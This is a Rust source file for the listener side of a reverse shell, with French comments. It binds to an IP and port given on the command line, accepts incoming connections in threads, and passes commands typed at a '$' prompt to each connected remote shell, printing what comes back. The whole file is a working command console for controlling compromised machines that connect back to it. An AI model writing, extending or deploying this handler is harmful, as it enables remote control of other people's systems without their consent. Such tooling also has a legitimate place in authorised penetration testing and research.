#[cfg(feature = "listener")]
use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::thread;

pub fn start_listener() {
    let args: Vec<String> = std::env::args().collect();
    
    if args.len() != 3 {
        eprintln!("Usage: {} <ip> <port>", args[0]);
        return;
    }

    let ip = &args[1];
    let port = &args[2];
    
    let listener = TcpListener::bind(format!("{}:{}", ip, port)).expect("Failed to bind listener");

    println!("Listening on {}:{}", ip, port);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("Connection established: {}", stream.peer_addr().unwrap());

                // Lancer un thread pour gérer la connexion
                thread::spawn(move || {
                    handle_client(stream);
                });
            }
            Err(e) => eprintln!("Connection failed: {}", e),
        }
    }
}

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 1024];
    loop {

        print!("$ "); // Affiche un prompt de type # sans saut de ligne
        std::io::stdout().flush().unwrap(); // Force l'affichage immédiat du prompt
        
        // Lecture de la commande entrée dans le terminal
        let mut command = String::new();
        std::io::stdin().read_line(&mut command).expect("Failed to read line");

        if command.trim() == "exit" {
            break;
        }

        // Envoi de la commande au reverse shell
        if let Err(e) = stream.write(command.as_bytes()) {
            eprintln!("Failed to send command: {}", e);
            break;
        }

        // Lecture de la réponse du reverse shell
        match stream.read(&mut buffer) {
            Ok(size) if size > 0 => {
                let response = String::from_utf8_lossy(&buffer[..size]);
                println!("{}", response);
            }
            _ => {
                println!("No response or connection closed.");
                break;
            }
        }
    }
}
